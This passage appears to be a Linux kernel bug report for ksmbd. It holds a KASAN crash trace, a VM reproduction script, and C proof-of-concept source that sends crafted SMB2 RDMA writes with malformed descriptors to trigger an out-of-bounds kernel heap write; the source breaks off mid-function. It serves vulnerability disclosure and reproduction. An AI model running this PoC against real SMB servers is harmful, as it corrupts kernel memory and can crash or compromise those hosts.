 post_alloc_hook+0xfe/0x140 /root/linux/mm/page_alloc.c:1871
 prep_new_page /root/linux/mm/page_alloc.c:1879
 get_page_from_freelist+0x10c7/0x34d0 /root/linux/mm/page_alloc.c:3943
 __alloc_frozen_pages_noprof+0x2de/0x3190 /root/linux/mm/page_alloc.c:543=
6
 alloc_slab_page /root/linux/mm/slub.c:3347
 allocate_slab /root/linux/mm/slub.c:3462
 new_slab+0xa7/0x6b0 /root/linux/mm/slub.c:3513
 refill_objects+0xeb/0x400 /root/linux/mm/slub.c:7417
 refill_sheaf /root/linux/mm/slub.c:2885
 __pcs_replace_empty_main+0x370/0x670 /root/linux/mm/slub.c:4774
 alloc_from_pcs /root/linux/mm/slub.c:4850
 slab_alloc_node /root/linux/mm/slub.c:4984
 __do_kmalloc_node /root/linux/mm/slub.c:5413
 __kmalloc_noprof+0x668/0x830 /root/linux/mm/slub.c:5439
 _kmalloc_noprof /root/linux/./include/linux/slab.h:995
 kernfs_fop_write_iter+0x26a/0x5f0 /root/linux/fs/kernfs/file.c:322
 new_sync_write /root/linux/fs/read_write.c:595
 vfs_write+0x69a/0xfd0 /root/linux/fs/read_write.c:687
 ksys_write+0x12a/0x250 /root/linux/fs/read_write.c:739
 do_syscall_x64 /root/linux/arch/x86/entry/syscall_64.c:61
 do_syscall_64+0x125/0x780 /root/linux/arch/x86/entry/syscall_64.c:84
 entry_SYSCALL_64_after_hwframe+0x77/0x7f /root/linux/arch/x86/entry/entr=
y_64.S:121
page last free pid 9603 tgid 9603 ts 56955377107 stack trace:
 reset_page_owner /root/linux/./include/linux/page_owner.h:26
 __free_pages_prepare /root/linux/mm/page_alloc.c:1418
 __free_frozen_pages+0x793/0x1140 /root/linux/mm/page_alloc.c:2962
 __pagetable_free /root/linux/./include/linux/mm.h:3804
 pagetable_free /root/linux/./include/linux/mm.h:3828
 pagetable_dtor_free /root/linux/./include/linux/mm.h:3927
 __tlb_remove_table /root/linux/./include/asm-generic/tlb.h:221
 __tlb_remove_table_free /root/linux/mm/mmu_gather.c:228
 tlb_remove_table_rcu+0x2cf/0x380 /root/linux/mm/mmu_gather.c:291
 rcu_do_batch /root/linux/kernel/rcu/tree.c:2650
 rcu_core+0x5f6/0x1250 /root/linux/kernel/rcu/tree.c:2919
 handle_softirqs+0x1e0/0x9d0 /root/linux/kernel/softirq.c:645
 __do_softirq /root/linux/kernel/softirq.c:679
 invoke_softirq /root/linux/kernel/softirq.c:519
 __irq_exit_rcu+0x182/0x250 /root/linux/kernel/softirq.c:758
 irq_exit_rcu+0x9/0x30 /root/linux/kernel/softirq.c:775
 instr_sysvec_apic_timer_interrupt /root/linux/arch/x86/kernel/apic/apic.=
c:1062
 sysvec_apic_timer_interrupt+0xa3/0xc0 /root/linux/arch/x86/kernel/apic/a=
pic.c:1062
 asm_sysvec_apic_timer_interrupt+0x1a/0x20 /root/linux/./arch/x86/include=
/asm/idtentry.h:674

Memory state around the buggy address:
 ffff888023a60f80: fa fb fb fb fc fc fc fc fa fb fb fb fc fc fc fc
 ffff888023a61000: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
>ffff888023a61080: fc fc fc fc 00 fc fc fc 05 fc fc fc 06 fc fc fc
                                  ^
 ffff888023a61100: 01 fc fc fc fa fc fc fc fa fc fc fc fa fc fc fc
 ffff888023a61180: fa fc fc fc fa fc fc fc fa fc fc fc 04 fc fc fc
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
```

---

## Reproduction script (reproduce.sh)

```bash
#!/bin/bash
# Minimal reproduction: ksmbd SMB Direct RDMA descriptor-length integer u=
nderflow
# in fs/smb/smbdirect/rw.c smbdirect_connection_rdma_xmit().
#
# Trigger: SMB2 WRITE with RemainingBytes=3D8 and two RDMA buffer descrip=
tors:
#   desc[0].length=3D4096 -> exceeds payload, clamp at rw.c:143 sets buf_=
len=3D0
#     (rw.c:146), then rw.c:153 does buf_len -=3D 4096, wrapping size_t;
#   desc[1].length=3D8192 -> now passes the clamp unclamped -> 8 KB OOB w=
rite.
# Expected: BUG: KASAN: slab-out-of-bounds in rxe_mr_copy, write past an
# 8-byte kmalloc region allocated by smb2_write <- handle_ksmbd_work.
#
# Preconditions already baked into the VM this script drives:
#   - kernel with CONFIG_SMB_SERVER_SMBDIRECT=3Dy, CONFIG_RDMA_RXE=3Dy,
#     CONFIG_KASAN=3Dy (bzImage at /root/linux/arch/x86/boot/bzImage)
#   - guest PoC binary /root/s3rig, VM launcher /root/image/run-vm.sh
set -x

SSH=3D"ssh -i /root/image/trixie.id_rsa -p 10021 -o StrictHostKeyChecking=
=3Dno root@127.0.0.1"

# 1. Boot the VM if needed, wait for SSH
$SSH true 2>/dev/null || (cd /root/image && nohup ./run-vm.sh >/dev/null =
2>&1 &)
until $SSH true 2>/dev/null; do sleep 10; done

# 2. Guest setup: ksmbd guest share + soft-RoCE link + victim file.
#    Every config line is load-bearing:
#      map to guest =3D bad user -> PoC logs in with bogus user, no passw=
ord
#      read only =3D no          -> the trigger is an SMB2 WRITE
#      guest ok =3D yes          -> guest access to the share
#      path =3D /tmp             -> world-traversable dir (guest =3D nobo=
dy);
#                                 /root is 0700 and would deny the CREATE
$SSH 'bash -s' <<'EOF'
printf '[global]\n\tmap to guest =3D bad user\n\n[share]\n\tpath =3D /tmp=
\n\tread only =3D no\n\tguest ok =3D yes\n' > /etc/ksmbd/ksmbd.conf
systemctl restart ksmbd
sleep 1
rdma link add rxe0 type rxe netdev eth0 2>/dev/null
printf 'VICTIM FILE CONTENT - pad to 8 bytes' > /tmp/victim.bin
chmod 666 /tmp/victim.bin
sysctl -w kernel.panic_on_warn=3D0 >/dev/null
EOF

# 3. Control run: single descriptor =3D=3D payload, no clamp, benign writ=
e ok
$SSH "cd /root && timeout 20 ./s3rig -h 10.0.2.15 -s '\\\\10.0.2.15\\shar=
e' -f victim.bin -m control"

# 4. Trigger run (dirA). The guest may crash from the heap corruption rig=
ht
#    after; the PoC prints TRIGGER/RUN-COMPLETE first.
$SSH "cd /root && timeout 20 ./s3rig -h 10.0.2.15 -s '\\\\10.0.2.15\\shar=
e' -f victim.bin -m dirA" | tee poc-dirA-stdout.log

# 5. KASAN report from the serial console log
grep -a -m1 -A60 'BUG: KASAN' /root/image/vm.log > kasan-report-dirA.txt
head -2 kasan-report-dirA.txt
```

## PoC source (poc/s3rig.c)

```c
// SPDX-License-Identifier: GPL-2.0
/*
 * s3rig - SMB Direct client for reproducing the ksmbd buf_len underflow.
 *
 * Does rdma_cm connect, SMB Direct negotiate, SMB2 NEGOTIATE / SESSION_S=
ETUP
 * (raw NTLMSSP, guest) / TREE_CONNECT / CREATE, then sends one crafted
 * RDMA-channel WRITE or READ.
 *
 * Use port 445, not 5445: transport_rdma.c:391 limits 5445 to iWARP devi=
ces
 * and rxe reports RDMA_NODE_IB_CA, which only the 445 listener takes.
 *
 * Mode "control" does a plain single-descriptor RDMA write first, so a s=
ilent
 * kernel log can be told apart from an RDMA path that never ran.
 *
 * Exit codes: 0 all selected stages ran, 1 a stage failed (see the last
 * S3RIG: line), 2 bad usage. Exit 0 says nothing about whether the kerne=
l
 * tripped; only dmesg does.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stddef.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <rdma/rdma_cma.h>
#include <infiniband/verbs.h>

/* ------------------------------------------------------------------ tun=
ables */

#define SMBD_PORT_DEFAULT  "445"      /* RoCE/IB listener; 5445 is iWARP-=
only  */
#define SMBD_MAX_SEND      1364u
#define SMBD_MAX_RECV      8192u
#define SMBD_MAX_FRAG      1048576u
#define NRECV              8
#define ATTACKER_MR_SIZE   (1u << 20)

/* direction A (write) defaults */
#define TRIG_BUFLEN        8u         /* RemainingBytes -> kvzalloc(8)   =
      */
#define TRIG_DESC0_LEN     4096u      /* > buflen  =3D> rw.c:143 clamps  =
        */
#define TRIG_DESC1_LEN     8192u      /* taken unclamped at data_buf + bu=
flen  */

#define PACKED __attribute__((packed))

/* ------------------------------------------------------------- wire str=
ucts  */

/* fs/smb/smbdirect/pdu.h:16 */
struct smbd_negotiate_req {
=09uint16_t min_version, max_version, reserved, credits_requested;
=09uint32_t preferred_send_size, max_receive_size, max_fragmented_size;
} PACKED;

/* fs/smb/smbdirect/pdu.h:27 */
struct smbd_negotiate_resp {
=09uint16_t min_version, max_version, negotiated_version, reserved;
=09uint16_t credits_requested, credits_granted;
=09uint32_t status, max_readwrite_size, preferred_send_size;
=09uint32_t max_receive_size, max_fragmented_size;
} PACKED;

/* fs/smb/smbdirect/pdu.h:47 */
struct smbd_data_transfer {
=09uint16_t credits_requested, credits_granted, flags, reserved;
=09uint32_t remaining_data_length, data_offset, data_length, padding;
} PACKED;
#define SMBD_DATA_OFFSET 0x18         /* pdu.h:42 SMBDIRECT_DATA_OFFSET  =
      */

/* include/linux/smbdirect.h:12 */
struct smbd_bdesc_v1 {
=09uint64_t offset;
=09uint32_t token;
=09uint32_t length;
} PACKED;

/* fs/smb/common/smb2pdu.h, SMB2 header, 64 bytes */
struct smb2_hdr_w {
=09uint32_t ProtocolId;
=09uint16_t StructureSize;
=09uint16_t CreditCharge;
=09uint32_t Status;
=09uint16_t Command;
=09uint16_t CreditRequest;
=09uint32_t Flags;
=09uint32_t NextCommand;
=09uint64_t MessageId;
=09uint32_t Reserved;
=09uint32_t TreeId;
=09uint64_t SessionId;
=09uint8_t  Signature[16];
} PACKED;

struct smb2_write_req_w {
=09struct smb2_hdr_w hdr;
=09uint16_t StructureSize;             /* 0x40, must be 49 */
=09uint16_t DataOffset;                /* 0x42 */
=09uint32_t Length;                    /* 0x44 */
=09uint64_t Offset;                    /* 0x48 */
=09uint64_t PersistentFileId;          /* 0x50 */
=09uint64_t VolatileFileId;            /* 0x58 */
=09uint32_t Channel;                   /* 0x60 */
=09uint32_t RemainingBytes;            /* 0x64 */
=09uint16_t WriteChannelInfoOffset;    /* 0x68 */
=09uint16_t WriteChannelInfoLength;    /* 0x6a */
=09uint32_t Flags;                     /* 0x6c */
} PACKED;                                   /* Buffer[] at 0x70 */

struct smb2_read_req_w {
=09struct smb2_hdr_w hdr;
=09uint16_t StructureSize;             /* 0x40, must be 49 */
=09uint8_t  Padding;                   /* 0x42 */
=09uint8_t  Flags;                     /* 0x43 */
=09uint32_t Length;                    /* 0x44 */
=09uint64_t Offset;                    /* 0x48 */
=09uint64_t PersistentFileId;          /* 0x50 */
=09uint64_t VolatileFileId;            /* 0x58 */
=09uint32_t MinimumCount;              /* 0x60 */
=09uint32_t Channel;                   /* 0x64 */
=09uint32_t RemainingBytes;            /* 0x68 */
=09uint16_t ReadChannelInfoOffset;     /* 0x6c */
=09uint16_t ReadChannelInfoLength;     /* 0x6e */
} PACKED;                                   /* Buffer[] at 0x70 */

#define SMB2_NEGOTIATE_CMD          0x0000
#define SMB2_SESSION_SETUP_CMD      0x0001
#define SMB2_TREE_CONNECT_CMD       0x0003
#define SMB2_CREATE_CMD             0x0005
#define SMB2_READ_CMD               0x0008
#define SMB2_WRITE_CMD              0x0009
#define SMB2_CHANNEL_RDMA_V1        0x00000001

#define SMB2_WRITE_BUFFER_OFF       0x70   /* offsetof(smb2_write_req, Bu=
ffer) */
#define SMB2_READ_BUFFER_OFF        0x70   /* offsetof(smb2_read_req,  Bu=
ffer) */
#define SMB2_SESS_BUFFER_OFF        0x58   /* offsetof(smb2_sess_setup_re=
q, Buffer) */
#define SMB2_TCON_BUFFER_OFF        0x48   /* offsetof(smb2_tree_connect_=
req, Buffer) */
#define SMB2_CREATE_BUFFER_OFF      0x78   /* offsetof(smb2_create_req, B=
uffer) */

#define STATUS_SUCCESS                    0x00000000u
#define STATUS_MORE_PROCESSING_REQUIRED   0xC0000016u

/* --------------------------------------------------------------- parame=
ters  */

struct trig_params {
=09uint64_t persistent_fid, volatile_fid, session_id, message_id;
=09uint32_t tree_id;
=09uint64_t mr_addr;
=09uint32_t mr_rkey;
=09uint32_t buflen, desc0_len, desc1_len;
};

static void put_hdr(struct smb2_hdr_w *h, uint16_t cmd, const struct trig=
_params *p)
{
=09memset(h, 0, sizeof(*h));
=09h->ProtocolId    =3D 0x424d53fe;     /* 0xFE 'S' 'M' 'B' */
=09h->StructureSize =3D 64;
=09h->CreditCharge  =3D 1;
=09h->Command       =3D cmd;
=09h->CreditRequest =3D 64;
=09h->MessageId     =3D p->message_id;
=09h->TreeId        =3D p->tree_id;
=09h->SessionId     =3D p->session_id;
}

/* --------------------------------------------------------------- trigge=
rs */

/*
 * Write direction. The path through the server:
 *   smb2pdu.c:7677  Channel =3D=3D SMB2_CHANNEL_RDMA_V1
 *   smb2pdu.c:7685  length =3D RemainingBytes
 *   smb2pdu.c:7691  wants Length =3D=3D 0 && DataOffset =3D=3D 0 && ch_o=
ffset >=3D 0x70
 *   smb2pdu.c:7288  ch_count =3D 32/16 =3D 2; only zero is rejected, and=
 the
 *                   ch_count !=3D 1 reject went away in ee1b05589659
 *   smb2pdu.c:7605  data_buf =3D kvzalloc(RemainingBytes)
 *   rw.c:143        desc[0].length > buf_len, so the clamp fires
 *   rw.c:146/153    buf_len =3D 0 then buf_len -=3D 4096, wrapping to ~S=
IZE_MAX
 *   rw.c:143        desc[1].length can no longer exceed buf_len
 *   rw.c:152        desc_buf walks past the end of data_buf
 */
static size_t build_write_trigger(uint8_t *out, size_t outsz,
=09=09=09=09  const struct trig_params *p, int ndesc)
{
=09struct smb2_write_req_w *w =3D (struct smb2_write_req_w *)out;
=09struct smbd_bdesc_v1 *desc;
=09size_t total =3D SMB2_WRITE_BUFFER_OFF + (size_t)ndesc * sizeof(*desc)=
;

=09if (outsz < total)
=09=09return 0;
=09memset(out, 0, total);

=09put_hdr(&w->hdr, SMB2_WRITE_CMD, p);
=09w->StructureSize          =3D 49;
=09w->DataOffset             =3D 0;                     /* smb2pdu.c:7691=
 */
=09w->Length                 =3D 0;                     /* smb2pdu.c:7691=
 */
=09w->Offset                 =3D 0;
=09w->PersistentFileId       =3D p->persistent_fid;
=09w->VolatileFileId         =3D p->volatile_fid;
=09w->Channel                =3D SMB2_CHANNEL_RDMA_V1;  /* smb2pdu.c:7677=
 */
=09w->RemainingBytes         =3D p->buflen;             /* smb2pdu.c:7605=
 */
=09w->WriteChannelInfoOffset =3D SMB2_WRITE_BUFFER_OFF; /* smb2pdu.c:7692=
 */
=09w->WriteChannelInfoLength =3D (uint16_t)(ndesc * sizeof(*desc));
=09w->Flags                  =3D 0;

=09desc =3D (struct smbd_bdesc_v1 *)(out + SMB2_WRITE_BUFFER_OFF);

=09/* larger than RemainingBytes, so rw.c:143 clamps */
=09desc[0].offset =3D p->mr_addr;
=09desc[0].token  =3D p->mr_rkey;
=09desc[0].length =3D p->desc0_len;

=09if (ndesc > 1) {
=09=09/* taken as-is after the wrap; lands at data_buf + RemainingBytes *=
/
=09=09desc[1].offset =3D p->mr_addr;
=09=09desc[1].token  =3D p->mr_rkey;
=09=09desc[1].length =3D p->desc1_len;
=09}
=09return total;
}

/*
 * Read direction. The buffer is sized ALIGN(Length, 8) at smb2pdu.c:7428=
 but
 * the sink gets nbytes, so Length has to match the file size for the ove=
rrun
 * to start right at the object end.
 */
static size_t build_read_trigger(uint8_t *out, size_t outsz,
=09=09=09=09 const struct trig_params *p, uint32_t length)
{
=09struct smb2_read_req_w *r =3D (struct smb2_read_req_w *)out;
=09struct smbd_bdesc_v1 *desc;
=09size_t total =3D SMB2_READ_BUFFER_OFF + 2 * sizeof(*desc);

=09if (outsz < total)
=09=09return 0;
=09memset(out, 0, total);

=09put_hdr(&r->hdr, SMB2_READ_CMD, p);
=09r->StructureSize         =3D 49;
=09r->Length                =3D length;
=09r->Offset                =3D 0;
=09r->PersistentFileId      =3D p->persistent_fid;
=09r->VolatileFileId        =3D p->volatile_fid;
=09r->MinimumCount          =3D 0;
=09r->Channel               =3D SMB2_CHANNEL_RDMA_V1;
=09r->RemainingBytes        =3D 0;
=09r->ReadChannelInfoOffset =3D SMB2_READ_BUFFER_OFF;
=09r->ReadChannelInfoLength =3D 2 * sizeof(*desc);

=09desc =3D (struct smbd_bdesc_v1 *)(out + SMB2_READ_BUFFER_OFF);
=09desc[0].offset =3D p->mr_addr;
=09desc[0].token  =3D p->mr_rkey;
=09desc[0].length =3D p->desc0_len;
=09desc[1].offset =3D p->mr_addr + p->desc0_len;
=09desc[1].token  =3D p->mr_rkey;
=09desc[1].length =3D p->desc1_len;
=09return total;
}

/* ------------------------------------------------------------------- ut=
ility */

static void hexdump(const char *tag, const uint8_t *b, size_t n)
{
=09size_t i;

=09printf("%s (%zu bytes)\n", tag, n);
=09for (i =3D 0; i < n; i++) {
=09=09if (i % 16 =3D=3D 0)
=09=09=09printf("  %04zx:", i);
=09=09printf(" %02x", b[i]);
=09=09if (i % 16 =3D=3D 15 || i + 1 =3D=3D n)
=09=09=09printf("\n");
=09}
=09fflush(stdout);
}

static size_t to_utf16(uint8_t *out, const char *s)
{
=09size_t n =3D 0;

=09while (*s) {
=09=09out[n++] =3D (uint8_t)*s++;
=09=09out[n++] =3D 0;
=09}
=09return n;
}

/* ----------------------------------------------------------------- tran=
sport */

struct rig {
=09struct rdma_event_channel *ec;
=09struct rdma_cm_id         *id;
=09struct ibv_pd             *pd;
=09struct ibv_cq             *cq;

=09uint8_t *sbuf; struct ibv_mr *smr;
=09uint8_t *rbuf[NRECV]; struct ibv_mr *rmr[NRECV];
=09uint8_t *abuf; struct ibv_mr *amr;

=09uint16_t pending_grant;
=09uint32_t peer_max_readwrite_size;
=09char devname[64];
};

static int wait_cm(struct rig *r, enum rdma_cm_event_type want)
{
=09struct rdma_cm_event *ev;

=09if (rdma_get_cm_event(r->ec, &ev)) {
=09=09perror("rdma_get_cm_event");
=09=09return -1;
=09}
=09if (ev->event !=3D want) {
=09=09fprintf(stderr, "S3RIG: cm event %s (status %d), wanted %s\n",
=09=09=09rdma_event_str(ev->event), ev->status, rdma_event_str(want));
=09=09rdma_ack_cm_event(ev);
=09=09return -1;
=09}
=09rdma_ack_cm_event(ev);
=09return 0;
}

static int post_recv(struct rig *r, int i)
{
=09struct ibv_sge sge =3D { .addr =3D (uintptr_t)r->rbuf[i],
=09=09=09       .length =3D SMBD_MAX_RECV, .lkey =3D r->rmr[i]->lkey };
=09struct ibv_recv_wr wr =3D { .wr_id =3D (uint64_t)i, .sg_list =3D &sge,=
 .num_sge =3D 1 }, *bad;

=09if (ibv_post_recv(r->id->qp, &wr, &bad))
=09=09return -1;
=09r->pending_grant++;
=09return 0;
}

static int post_send(struct rig *r, size_t len)
{
=09struct ibv_sge sge =3D { .addr =3D (uintptr_t)r->sbuf,
=09=09=09       .length =3D (uint32_t)len, .lkey =3D r->smr->lkey };
=09struct ibv_send_wr wr =3D { .wr_id =3D 0x5000, .sg_list =3D &sge, .num=
_sge =3D 1,
=09=09=09=09  .opcode =3D IBV_WR_SEND,
=09=09=09=09  .send_flags =3D IBV_SEND_SIGNALED }, *bad;

=09return ibv_post_send(r->id->qp, &wr, &bad);
}

/* Poll until one RECV completes; drain SEND completions on the way.
 * timeout_ms <=3D 0 means "wait forever". Returns the recv index or -1. =
*/
static int poll_recv(struct rig *r, uint32_t *byte_len, int timeout_ms)
{
=09struct ibv_wc wc;
=09struct timespec t0, tn;

=09clock_gettime(CLOCK_MONOTONIC, &t0);
=09for (;;) {
=09=09int n =3D ibv_poll_cq(r->cq, 1, &wc);

=09=09if (n < 0) {
=09=09=09fprintf(stderr, "S3RIG: ibv_poll_cq failed\n");
=09=09=09return -1;
=09=09}
=09=09if (n =3D=3D 0) {
=09=09=09if (timeout_ms > 0) {
=09=09=09=09long ms;

=09=09=09=09clock_gettime(CLOCK_MONOTONIC, &tn);
=09=09=09=09ms =3D (tn.tv_sec - t0.tv_sec) * 1000 +
=09=09=09=09     (tn.tv_nsec - t0.tv_nsec) / 1000000;
=09=09=09=09if (ms > timeout_ms) {
=09=09=09=09=09fprintf(stderr, "S3RIG: poll timeout after %ld ms\n", ms);
=09=09=09=09=09return -1;
=09=09=09=09}
=09=09=09}
=09=09=09usleep(200);
=09=09=09continue;
=09=09}
=09=09if (wc.status !=3D IBV_WC_SUCCESS) {
=09=09=09fprintf(stderr, "S3RIG: wc status %s (opcode %d, wr_id %llu)\n",
=09=09=09=09ibv_wc_status_str(wc.status), wc.opcode,
=09=09=09=09(unsigned long long)wc.wr_id);
=09=09=09return -1;
=09=09}
=09=09if (wc.opcode =3D=3D IBV_WC_RECV) {
=09=09=09*byte_len =3D wc.byte_len;
=09=09=09return (int)wc.wr_id;
=09=09}
=09=09/* else: a SEND completion; keep polling */
=09}
}

static int drain_send(struct rig *r)
{
=09struct ibv_wc wc;
=09long spins =3D 0;

=09for (;;) {
=09=09int n =3D ibv_poll_cq(r->cq, 1, &wc);

=09=09if (n < 0)
=09=09=09return -1;
=09=09if (n =3D=3D 0) {
=09=09=09if (++spins > 20000000)
=09=09=09=09return -1;
=09=09=09continue;
=09=09}
=09=09if (wc.status !=3D IBV_WC_SUCCESS) {
=09=09=09fprintf(stderr, "S3RIG: send wc status %s\n",
=09=09=09=09ibv_wc_status_str(wc.status));
=09=09=09return -1;
=09=09}
=09=09if (wc.opcode !=3D IBV_WC_RECV)
=09=09=09return 0;
=09=09/* An unexpected recv arrived first. We cannot push it back, so
=09=09 * treat it as a protocol error instead of silently losing it. */
=09=09fprintf(stderr, "S3RIG: unexpected RECV while draining SEND\n");
=09=09return -1;
=09}
}

static int rig_connect(struct rig *r, const char *host, const char *port)
{
=09struct rdma_addrinfo hints =3D { .ai_port_space =3D RDMA_PS_TCP }, *ra=
i;
=09struct ibv_qp_init_attr qa;
=09struct rdma_conn_param cp;
=09int i;

=09r->ec =3D rdma_create_event_channel();
=09if (!r->ec) { perror("rdma_create_event_channel"); return -1; }
=09if (rdma_create_id(r->ec, &r->id, NULL, RDMA_PS_TCP)) { perror("rdma_c=
reate_id"); return -1; }
=09if (rdma_getaddrinfo(host, port, &hints, &rai)) { perror("rdma_getaddr=
info"); return -1; }
=09if (rdma_resolve_addr(r->id, NULL, rai->ai_dst_addr, 5000)) { perror("=
rdma_resolve_addr"); return -1; }
=09if (wait_cm(r, RDMA_CM_EVENT_ADDR_RESOLVED)) return -1;
=09if (rdma_resolve_route(r->id, 5000)) { perror("rdma_resolve_route"); r=
eturn -1; }
=09if (wait_cm(r, RDMA_CM_EVENT_ROUTE_RESOLVED)) return -1;

=09snprintf(r->devname, sizeof(r->devname), "%s",
=09=09 ibv_get_device_name(r->id->verbs->device));

=09r->pd =3D ibv_alloc_pd(r->id->verbs);
=09r->cq =3D ibv_create_cq(r->id->verbs, 256, NULL, NULL, 0);
=09if (!r->pd || !r->cq) { fprintf(stderr, "S3RIG: pd/cq failed\n"); retu=
rn -1; }

=09memset(&qa, 0, sizeof(qa));
=09qa.send_cq =3D r->cq;
=09qa.recv_cq =3D r->cq;
=09qa.qp_type =3D IBV_QPT_RC;
=09qa.cap.max_send_wr  =3D 32;
=09qa.cap.max_recv_wr  =3D 32;
=09qa.cap.max_send_sge =3D 4;
=09qa.cap.max_recv_sge =3D 4;
=09if (rdma_create_qp(r->id, r->pd, &qa)) { perror("rdma_create_qp"); ret=
urn -1; }

=09r->sbuf =3D calloc(1, SMBD_MAX_SEND);
=09r->abuf =3D malloc(ATTACKER_MR_SIZE);
=09if (!r->sbuf || !r->abuf) return -1;
=09memset(r->abuf, 0x41, ATTACKER_MR_SIZE);

=09r->smr =3D ibv_reg_mr(r->pd, r->sbuf, SMBD_MAX_SEND, IBV_ACCESS_LOCAL_=
WRITE);
=09if (!r->smr) { perror("ibv_reg_mr send"); return -1; }
=09r->amr =3D ibv_reg_mr(r->pd, r->abuf, ATTACKER_MR_SIZE,
=09=09=09    IBV_ACCESS_LOCAL_WRITE | IBV_ACCESS_REMOTE_READ |
=09=09=09    IBV_ACCESS_REMOTE_WRITE);
=09if (!r->amr) { perror("ibv_reg_mr attacker"); return -1; }

=09for (i =3D 0; i < NRECV; i++) {
=09=09r->rbuf[i] =3D calloc(1, SMBD_MAX_RECV);
=09=09if (!r->rbuf[i]) return -1;
=09=09r->rmr[i] =3D ibv_reg_mr(r->pd, r->rbuf[i], SMBD_MAX_RECV,
=09=09=09=09       IBV_ACCESS_LOCAL_WRITE);
=09=09if (!r->rmr[i]) { perror("ibv_reg_mr recv"); return -1; }
=09=09if (post_recv(r, i)) { perror("ibv_post_recv"); return -1; }
=09}

=09memset(&cp, 0, sizeof(cp));
=09cp.initiator_depth     =3D 8;
=09cp.responder_resources =3D 8;
=09cp.retry_count         =3D 6;
=09cp.rnr_retry_count     =3D 6;
=09if (rdma_connect(r->id, &cp)) { perror("rdma_connect"); return -1; }
=09return wait_cm(r, RDMA_CM_EVENT_ESTABLISHED);
}

/* SMB Direct negotiate, [MS-SMBD] 2.2.1/2.2.2, parsed by fs/smb/smbdirec=
t/accept.c */
static int smbd_negotiate(struct rig *r)
{
=09struct smbd_negotiate_req *q =3D (struct smbd_negotiate_req *)r->sbuf;
=09struct smbd_negotiate_resp *p;
=09uint32_t blen =3D 0;
=09int idx;

=09memset(q, 0, sizeof(*q));
=09q->min_version         =3D 0x0100;
=09q->max_version         =3D 0x0100;
=09q->credits_requested   =3D 255;         /* accept.c: must not be 0 */
=09q->preferred_send_size =3D SMBD_MAX_SEND;
=09q->max_receive_size    =3D SMBD_MAX_RECV;   /* >=3D 128    accept.c:38=
5 */
=09q->max_fragmented_size =3D SMBD_MAX_FRAG;   /* >=3D 131072 accept.c:39=
4 */

=09if (post_send(r, sizeof(*q)) || drain_send(r))
=09=09return -1;
=09idx =3D poll_recv(r, &blen, 20000);
=09if (idx < 0)
=09=09return -1;
=09if (blen < sizeof(*p)) {
=09=09fprintf(stderr, "S3RIG: short smbd negotiate response (%u)\n", blen=
);
=09=09return -1;
=09}
=09p =3D (struct smbd_negotiate_resp *)r->rbuf[idx];
=09r->peer_max_readwrite_size =3D p->max_readwrite_size;
=09printf("S3RIG: smbd negotiated ver=3D0x%04x status=3D0x%08x credits_gr=
anted=3D%u "
=09       "max_readwrite_size=3D%u max_receive_size=3D%u\n",
=09       p->negotiated_version, p->status, p->credits_granted,
=09       p->max_readwrite_size, p->max_receive_size);
=09fflush(stdout);
=09if (p->status !=3D 0)
=09=09return -1;
=09return post_recv(r, idx);
}

/*
 * One SMB2 request in one SMB Direct data transfer, then collect the res=
ponse
 * (reassembling if the server fragments it).
 */
static int smb2_xchg(struct rig *r, const uint8_t *pdu, size_t pdulen,
=09=09     uint8_t *rsp, size_t rspcap, size_t *rsplen)
{
=09struct smbd_data_transfer *dt =3D (struct smbd_data_transfer *)r->sbuf=
;
=09size_t got =3D 0;
=09int first =3D 1;

=09if (SMBD_DATA_OFFSET + pdulen > SMBD_MAX_SEND) {
=09=09fprintf(stderr, "S3RIG: pdu too large for one data transfer\n");
=09=09return -1;
=09}
=09memset(r->sbuf, 0, SMBD_DATA_OFFSET);
=09dt->credits_requested     =3D 255;
=09dt->credits_granted       =3D r->pending_grant;
=09dt->flags                 =3D 0;
=09dt->remaining_data_length =3D 0;
=09dt->data_offset           =3D SMBD_DATA_OFFSET;
=09dt->data_length           =3D (uint32_t)pdulen;
=09dt->padding               =3D 0;
=09memcpy(r->sbuf + SMBD_DATA_OFFSET, pdu, pdulen);
=09r->pending_grant =3D 0;

=09if (post_send(r, SMBD_DATA_OFFSET + pdulen) || drain_send(r))
=09=09return -1;

=09for (;;) {
=09=09struct smbd_data_transfer *in;
=09=09uint32_t blen =3D 0, dlen, doff, rem;
=09=09int idx =3D poll_recv(r, &blen, 60000);

=09=09if (idx < 0)
=09=09=09return -1;
=09=09in   =3D (struct smbd_data_transfer *)r->rbuf[idx];
=09=09dlen =3D in->data_length;
=09=09doff =3D in->data_offset;
=09=09rem  =3D in->remaining_data_length;
=09=09if (dlen) {
=09=09=09uint32_t copy =3D dlen;

=09=09=09if ((uint64_t)doff + dlen > blen) {
=09=09=09=09fprintf(stderr, "S3RIG: malformed data transfer\n");
=09=09=09=09return -1;
=09=09=09}
=09=09=09if (got + copy > rspcap)
=09=09=09=09copy =3D (uint32_t)(rspcap - got);
=09=09=09memcpy(rsp + got, r->rbuf[idx] + doff, copy);
=09=09=09got +=3D copy;
=09=09}
=09=09if (post_recv(r, idx))
=09=09=09return -1;
=09=09/* A message ends at the fragment whose remaining_data_length is 0.
=09=09 * data_length =3D=3D 0 means a pure credit grant: keep waiting. */
=09=09if (dlen && !rem)
=09=09=09break;
=09}
=09(void)first;
=09*rsplen =3D got;
=09return 0;
}

static uint32_t rsp_status(const uint8_t *rsp, size_t len)
{
=09uint32_t s;

=09if (len < 12)
=09=09return 0xFFFFFFFFu;
=09memcpy(&s, rsp + 8, 4);
=09return s;
}

/* -------------------------------------------------------------- SMB2 st=
aging */

static int smb2_negotiate(struct rig *r, struct trig_params *p)
{
=09uint8_t pdu[256], rsp[2048];
=09size_t rlen =3D 0;
=09uint8_t *b =3D pdu;

=09memset(pdu, 0, sizeof(pdu));
=09put_hdr((struct smb2_hdr_w *)b, SMB2_NEGOTIATE_CMD, p);
=09*(uint16_t *)(b + 64)  =3D 36;        /* StructureSize */
=09*(uint16_t *)(b + 66)  =3D 1;         /* DialectCount  */
